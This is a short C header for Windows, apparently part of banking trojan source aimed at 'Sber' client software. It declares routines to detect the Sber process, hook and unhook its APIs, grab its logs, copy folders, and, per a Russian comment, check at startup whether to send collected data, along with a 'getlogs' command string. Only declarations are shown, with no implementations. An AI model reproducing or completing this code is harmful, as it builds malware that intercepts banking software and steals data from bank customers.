#ifndef		SBERH
#define		SBERH

#include <windows.h>


//*********************************************************************
bool UnHookSber();

//*********************************************************************
bool HookSber();

//*********************************************************************
bool WINAPI IsSberProcess();
bool HookSberApi();
DWORD WINAPI grabsberlog();
const static char GetSberLog[] = "getlogs\0";
DWORD WINAPI CopyFolderThread( LPVOID lpData );

// запускаем при старте ищим файл с путем к екзе файлу, и смотрим надо ли отправлять
void FirstInitSber();

#endif		//SBERH